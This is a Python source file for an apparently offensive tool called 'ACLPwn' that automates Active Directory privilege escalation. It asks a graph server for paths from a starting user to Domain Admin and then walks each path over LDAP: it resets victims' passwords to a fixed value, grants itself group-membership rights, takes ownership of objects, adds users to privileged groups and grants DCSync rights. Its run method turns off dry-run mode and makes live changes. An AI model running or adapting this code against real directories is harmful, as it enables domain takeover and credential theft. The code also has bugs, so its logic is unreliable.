# Word of advice: DO NOT USE THIS
# 
# 
# 
# 

import asyncio
import json
import traceback
import pprint

import aiohttp
from msldap.commons.url import MSLDAPURLDecoder
from msldap.commons.exceptions import LDAPModifyException
from aiosmb.commons.connection.url import SMBConnectionURL


class ACLPwn:
	def __init__(self, url, ldap_url, smb_url, graph_id, start_user_sid = None):
		self.jd_url = url
		self.ldap_url = ldap_url
		self.smb_url = smb_url
		self.graph_id = graph_id
		self.start_user_sid = start_user_sid
		self.domainsids = []
		self.dagroups = []
		self.newpass = 'Passw0rd!1'
		self.objcache = {}
		self.current_user = None
		self.dry_run = True

		self.is_graph_loaded = False

	def get_ldap(self):
		return MSLDAPURLDecoder(self.ldap_url)

	def get_smb(self):
		return SMBConnectionURL(self.smb_url)

	async def get_start_user_sid(self):
		try:
			print('Determining start user SID')
			if self.start_user_sid is not None:
				return self.start_user_sid, None
			
			domain_ids = []
			ldap_creds = self.get_ldap().get_credential()
			smb_creds = self.get_smb().get_credential()

			async with aiohttp.ClientSession() as session:
				async with session.get('%s/graph/%s/getdomainids/' % (self.jd_url, self.graph_id)) as resp:
					if resp.status != 200:
						raise Exception('Failed to query domain IDs! Status: %s' % resp.status)
					domain_ids_raw = await resp.text()
					domain_ids = json.loads(domain_ids_raw)
					if len(domain_ids) == 0:
						raise Exception('No domain ID belogns to this graph?!')
			
			for proto, username in [('LDAP', ldap_creds.username), ('SMB', smb_creds.username)]:
				async with aiohttp.ClientSession() as session:
					for domain_id in domain_ids:
						async with session.get('%s/user/%s/by_samaccountname/%s' % (self.jd_url, domain_id, username)) as resp:
							if resp.status not in [200, 204]:
								raise Exception('Failed to search for username in database! Status: %s' % resp.status)
							if resp.status == 204:
								print('Not found in doimain id %s' % domain_id)
								continue
							if resp.status == 200:
								data = await resp.text()
								user = json.loads(data)
								self.start_user_sid = user['objectSid']
								print('Found current user using proto %s! SID: %s' % (proto, self.start_user_sid))
								return self.start_user_sid, None
			
			return None, Exception('User not found in database!')
		except Exception as e:
			return None, e

	async def load_graph(self):
		try:
			print('Asking server to load graph data to memory...')
			async with aiohttp.ClientSession() as session:
				async with session.post('%s/graph?adids=%s' % (self.jd_url, self.graph_id)) as resp:
					if resp.status != 200:
						raise Exception('Loading graphid failed! Status: %s' % resp.status)
					await resp.text()
					print('Graph data loaded!')

			self.is_graph_loaded = True
			return True, None
		except Exception as e:
			return False, e
	
	async def get_path_owned_da(self):
		try:
			async with aiohttp.ClientSession() as session:
				async with session.get('%s/graph?adids=%s' % (self.jd_url,self.graph_id)) as resp:
					if resp.status != 200:
						raise Exception('get_path_owned_dafailed! Status: %s' % resp.status)
					await resp.text()

		except Exception as e:
			return False, e

		
	async def get_path(self, src_sid, dst_sid, exclude = ['hasSession']):
		try:
			print('Asking for paths from user %s to the DA group' % src_sid)
			url = '%s/graph/%s/query/path?src=%s&dst=%s&format=%s' % (self.jd_url,self.graph_id, src_sid, dst_sid, 'path')
			if len(exclude) > 0:
				exclude = '%2C'.join(exclude)
			url += '&exclude=%s' % exclude
			async with aiohttp.ClientSession() as session:
				async with session.get(url) as resp:
					if resp.status != 200:
						raise Exception('Loading graphid failed! Status: %s' % resp.status)
					data = await resp.text()
			res = json.loads(data)
			if len(res) != 0:
				print('Got PATH to DA!')
				pprint.pprint(res)
			else:
				print('Server could not find a way to DA :(')
			return res, None
		except Exception as e:
			return False, e
	
	async def get_domainsids(self):
		try:
			async with aiohttp.ClientSession() as session:
				async with session.get('%s/graph/%s/getdomainsids/' % (self.jd_url,self.graph_id)) as resp:
					if resp.status != 200:
						raise Exception('Loading graphid failed! Status: %s' % resp.status)
					body = await resp.text()
					self.domainsids = json.loads(body)
			
			for dsid in self.domainsids:
				if dsid.endswith('-') is False:
					dsid += '-'
				self.dagroups.append(dsid+'512')

			return True, None
		except Exception as e:
			return False, e

	async def get_objinfo(self, sid, stype):
		try:
			if sid not in self.objcache:
				#http://127.0.0.1:5000/group/1/by_sid/S-1-5-21-4136613964-2812260436-2179565534-2643
				async with aiohttp.ClientSession() as session:
					if stype == 'domain':
						async with session.get('%s/%s/by_sid/%s' % (self.jd_url, stype, sid)) as resp:
							if resp.status != 200:
								raise Exception('Loading graphid failed! Status: %s' % resp.status)
							
							body = await resp.text()
							self.objcache[sid] = json.loads(body)
					else:
						async with session.get('%s/%s/%s/by_sid/%s' % (self.jd_url, stype, self.graph_id, sid)) as resp:
							if resp.status != 200:
								raise Exception('Loading graphid failed! Status: %s' % resp.status)
					
							body = await resp.text()
							self.objcache[sid] = json.loads(body)
			
			return self.objcache[sid], None
		except Exception as e:
			return False, e

	async def get_dn(self, sid, stype, ad_id):
		try:
			userinfo, err = await self.get_objinfo(sid, stype)
			if err is not None:
				raise err
			
			if 'dn' in userinfo:
				return userinfo['dn'], None
			if 'distinguishedName' in userinfo:
				return userinfo['distinguishedName'], None

			else:
				print(userinfo)
		except Exception as e:
			return False, e

	async def change_user(self, sid, ad_id = 1):
		try:
			print('Changing user...')
			if sid not in self.objcache:
				_, err = self.get_objinfo(sid, 'user')
				if err is not None:
					raise err
			self.current_user = self.objcache[sid]['sAMAccountName']

		except Exception as e:
			return False, e
	
	async def changepw_user(self, src_sid, dst_sid, ad_id = 1):
		try:
			
			user_dn, err = await self.get_dn(dst_sid, 'user', ad_id)
			if err is not None:
				raise err

			ldapclient = self.get_ldap().get_client()
			print('Changing user %s \'s password to %s' % (user_dn, self.newpass))
			if self.dry_run is True:
				print('Changing user %s \'s password to %s' % (user_dn, self.newpass))
				return True, None

			_, err = await ldapclient.connect()
			if err is not None:
				raise err
			
			_, err = await ldapclient.change_password(user_dn, self.newpass)
			if err is not None:
				raise err
			
			print('User password changed!')
			return True, None
		except Exception as e:
			print('Failed to change password for user %s' % user_dn)
			return False, e

	async def add_addmember_privs(self, src_sid, dst_sid, ad_id = 1):
		try:
			
			user_dn, err = await self.get_dn(src_sid, 'user', ad_id)
			if err is not None:
				raise err

			group_dn, err = await self.get_dn(dst_sid, 'group', ad_id)
			if err is not None:
				raise err

			if self.dry_run is True:
				print('Adding addmember privs to user %s \'s on group %s' % (user_dn, group_dn))
				return True, None

			ldapclient = self.get_ldap().get_client()
			print('Adding addmember privs to user %s \'s on group %s' % (user_dn, group_dn))
			_, err = await ldapclient.connect()
			if err is not None:
				raise err
			
			_, err = await ldapclient.add_priv_addmember(user_dn, group_dn)
			if err is not None:
				raise err
			
			print('User granted addmember privileges!')
			return True, None

		except Exception as e:
			print('Failed to add addmember privilege to %s' % group_dn)
			return False, e
	
	async def add_user_to_group(self, src_sid, dst_sid, ad_id = 1):
		try:
			
			user_dn, err = await self.get_dn(src_sid, 'user', ad_id)
			if err is not None:
				raise err
			
			group_dn, err = await self.get_dn(dst_sid, 'group', ad_id)
			if err is not None:
				raise err

			if self.dry_run is True:
				print('Adding user %s \'s to group %s' % (user_dn, group_dn))
				return True, None

			ldapclient = self.get_ldap().get_client()
			print('Adding user %s \'s to group %s' % (user_dn, group_dn))
			_, err = await ldapclient.connect()
			if err is not None:
				raise err
			
			_, err = await ldapclient.add_user_to_group(user_dn, group_dn)
			if err is not None:
				if not (isinstance(err, LDAPModifyException) and err.resultcode == 68):
					print(err.resultcode)
					print(type(err.resultcode))
					raise err
			
			print('User added to the group!')
			return True, None

		except Exception as e:
			print('Failed to add user %s to group %s' % (user_dn, group_dn))
			return False, e

	async def write_owner(self, src_sid, dst_sid, dst_type, ad_id = 1):
		try:
			
			user_dn, err = await self.get_dn(src_sid, 'user', ad_id)
			if err is not None:
				raise err
			
			group_dn, err = await self.get_dn(dst_sid, dst_type, ad_id)
			if err is not None:
				raise err

			if self.dry_run is True:
				print('Changing Owner of %s (%s) to %s' % (group_dn, dst_type, user_dn))
				return True, None

			ldapclient = self.get_ldap().get_client()
			print('Changing Owner of %s (%s) to %s' % (group_dn, dst_type, user_dn))
			_, err = await ldapclient.connect()
			if err is not None:
				raise err
			
			_, err = await ldapclient.change_priv_owner(src_sid, group_dn)
			if err is not None:
				raise err
			
			print('Object owner changed!')

			


			return True, None
		except Exception as e:
			print('Failed to change ownership of object %s (%s) to user %s' % (group_dn, dst_type ,user_dn))
			return False, e

	async def add_domain_sync(self, src_sid, dst_sid, ad_id = 1):
		try:
			
			user_dn, err = await self.get_dn(src_sid, 'user', ad_id)
			if err is not None:
				raise err
			
			forest_dn, err = await self.get_dn(dst_sid, 'domain', ad_id)
			if err is not None:
				raise err

			if self.dry_run is True:
				print('Adding DcSync rights to user %s' % user_dn)
				return True, None

			ldapclient = self.get_ldap().get_client()
			print('Adding DcSync rights to user %s' % user_dn)
			_, err = await ldapclient.connect()
			if err is not None:
				raise err
			
			_, err = await ldapclient.add_priv_dcsync(user_dn, forest_dn)
			if err is not None:
				raise err
			
			print('User got DcSync rights!')
			return True, None

		except Exception as e:
			print('Failed to add DcSync rights to user %s' % user_dn)
			return False, e


	async def build_chain(self, paths):
		try:
			# breaking up the path to individual steps, filtering the ones which are feasible, and selecting one
			# TODO: some improvement on the selection rpcess
			print('build_chain')
			print()
			paths = sorted(paths, key=len) #favouring shorter paths
			links = []
			for path in paths:
				print('<<<<<<<<<<<<< NEXT >>>>>>>>>>>>>>>>>>>>>>>')
				print(path)
				i = 0
				link = []
				while i < len(path)-1:
					if path[i+1] != 'member':
						link.append((path[i], path[i+1], path[i+2]))
						print((path[i], path[i+1], path[i+2]))
						i += 2
					else:
						if len(path[i:]) >= 4:
							link.append((path[i], path[i+3], path[i+4]))
							print((path[i], path[i+3], path[i+4]))
						i += 4

				links.append(link)
			
			print('Processing links')
			print(len(links))
			selected_actions = None
			for link in links:
				if selected_actions is not None:
					break
				actions = []
				for action in link:
					src_sid = action[0][0]
					src_type = action[0][1]
					atype = action[1].lower()
					dst_sid = action[2][0]
					dst_type = action[2][1]
					
					if atype == 'user-force-change-password':
						if dst_type == 'user':
							actions.append(self.changepw_user(src_sid, dst_sid))
							actions.append(self.change_user(dst_sid))
						else:
							print('Action %s not supported on %s' % (atype, dst_type))
							break 

					elif atype in ['addmember', 'extendedrightall']:
						if dst_type == 'group':
							actions.append(self.add_user_to_group(src_sid, dst_sid))
						else:
							print('Action %s not supported on %s' % (atype, dst_type))
							break 
					
					elif atype in ['dcsync', 'getchangesall']:
						continue
					
					elif atype in ['writedacl', 'genericall', 'genericwrite', 'owns']:
						if dst_type == 'group':
							if atype in ['writedacl', 'owns']:
								#add_addmember_privs
								actions.append(self.add_addmember_privs(src_sid, dst_sid))
							actions.append(self.add_user_to_group(src_sid, dst_sid))
						
						elif dst_type == 'domain':
							actions.append(self.add_domain_sync(src_sid, dst_sid))

						else:
							print('Action %s not supported on %s' % (atype, dst_type))
							break

					elif atype == 'writeowner':
						if dst_type == 'group':
							actions.append(self.write_owner(src_sid, dst_sid, 'group'))
							actions.append(self.add_addmember_privs(src_sid, dst_sid))
							actions.append(self.add_user_to_group(src_sid, dst_sid))

						elif dst_type == 'domain':
							actions.append(self.write_owner(src_sid, dst_sid, 'domain'))
							actions.append(self.add_domain_sync(src_sid, dst_sid))
						else:
							print('Action %s not supported on %s' % (atype, dst_type))
							break
					
					#elif atype == 'adminto':
					#	if dst_type == 'domain':
					#		actions.append(self.dump_creds(src_sid, dst_sid))
					#	else:
					#		print('Action %s not supported on %s' % (atype, dst_type))
					#		break
					
					else:
						print('Action %s not supported on %s' % (atype, dst_type))
						break
					
				else:
					selected_actions = actions

			if selected_actions is None:
				raise Exception('No action found which would yield domain admin rights.')
			

			err = None
			action_to_cancel = []
			for i, action in enumerate(actions):
				if err is not None:
					action_to_cancel.append(action)
					continue
				_, err = await action
			
			print(action_to_cancel)
			#for action in action_to_cancel:
			#	action.cancel()
			
			if err is not None:
				raise err
				

			print('Actions succeeded we should be DA now!')
			
			return True, None
		except Exception as e:
			return False, e

	async def run(self, dry_run = True):
		try:
			self.dry_run = False
			if self.is_graph_loaded is False:
				_, err = await self.load_graph()
				if err is not None:
					raise err
			
			if len(self.domainsids) == 0:
				_, err = await self.get_domainsids()
				if err is not None:
					raise err
			
			_, err = await self.get_start_user_sid()
			if err is not None:
				raise err
				
			paths = []
			for dasid in self.domainsids: #self.dagroups:
				res, err = await self.get_path(self.start_user_sid, dasid)
				if err is not None:
					raise err
				paths += res

			if len(paths) == 0:
				raise Exception('No paths to DA!')

			#else:
			#	paths, err = await self.get_path_owned_da()
			#	if err is not None:
			#		raise err
				
			chain, err = await self.build_chain(paths)
			if err is not None:
				raise err
			


			return True, None
		except Exception as e:
			traceback.print_exc()
			return False, e


def main():
	import argparse

	parser = argparse.ArgumentParser(description='acl autopwn')
	parser.add_argument('ldapurl', help = 'server listen port')
	parser.add_argument('smburl', help = 'server listen ip')
	parser.add_argument('url', default='http://127.0.0.1:5000', help = 'server listen ip')
	parser.add_argument('graphid', default = 1, type=int, help = 'graphid')
	parser.add_argument('-u', '--user-sid', help = 'Start user SID')

	args = parser.parse_args()

	ap = ACLPwn(args.url, args.ldapurl, args.smburl, args.graphid, args.user_sid)

	asyncio.run(ap.run())

if __name__ == '__main__':
	main()